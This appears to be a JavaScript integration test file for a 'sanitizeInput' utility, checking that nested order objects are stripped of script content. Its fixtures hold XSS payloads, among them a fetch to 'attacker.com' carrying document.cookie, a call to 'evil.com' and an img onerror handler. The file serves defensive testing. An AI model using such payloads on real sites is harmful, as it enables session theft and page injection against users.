import { sanitizeInput } from "@/utils/inputSanitizer";

describe("Integration Tests", () => {
  test("sanitize complete order flow with nested malicious inputs", () => {
    const maliciousOrder = {
      orderId: '<script>fetch("http://attacker.com/api/get?token=") + document.cookie</script>',
      items: [
        {
          productId: '<script>alert("xss")</script>',
          quantity: '<script>sendToServer("exfil")</script>',
          price: '<script>eval("configChange")</script>'
        }
      ],
      customer: {
        id: '<script>fetch("http://evil.com/api/admin")</script>',
        name: "<img src=x onerror=\"alert('adminAccess')\">hacker",
        points: "<script>1000000</script>"
      },
      payment: {
        method: '<script>confirm("deleteAllData")</script>',
        amount: "<script>exfiltrateData()</script>",
        status: "<script>deleteRecords()</script>"
      },
      shipping: {
        address: "<script>maliciousCode()</script>",
        phone: "<script>sendAllCookies()</script>",
        name: "Robert<script>alert(1)</script>"
      }
    };

    const sanitized = sanitizeInput(maliciousOrder);
    expect(sanitized.orderId).toBe("");
    expect(sanitized.items[0].productId).toBe("");
    expect(sanitized.customer.id).toBe("");
    expect(sanitized.customer.name).toBe("hacker");
    expect(sanitized.customer.points).toBe("");
    expect(sanitized.payment.method).toBe("");
    expect(sanitized.payment.amount).toBe("");
  });

  test("multi-step transaction sanitization flow", () => {
    const complexOrder = {
      orderId: '<script>fetch("http://orders.api/all")</script>',
      trackingId: 'TRACK-<script>alert("data leak")</script>',
      status: "<script>updateAllOrders()</script>",
      customerId: '<script>fetch("http://user.api/authenticated")</script>',
      payment: {
        method: "<script>confirmPayment()</script>",
        status: "<script>sendToPaymentGateway()</script>"
      },
      items: [
        {
          productId: '<script>fetch("http://products.api/pricing")</script>',
          quantity: "1<script>adjustQuantity()</script>",
          price: "<script>calculateTotal()</script>"
        }
      ]
    };

    const sanitized = sanitizeInput(complexOrder);
    expect(sanitized.orderId).toBe("");
    expect(sanitized.trackingId).toBe("TRACK-");
    expect(sanitized.status).toBe("");
    expect(sanitized.customerId).toBe("");
  });
});
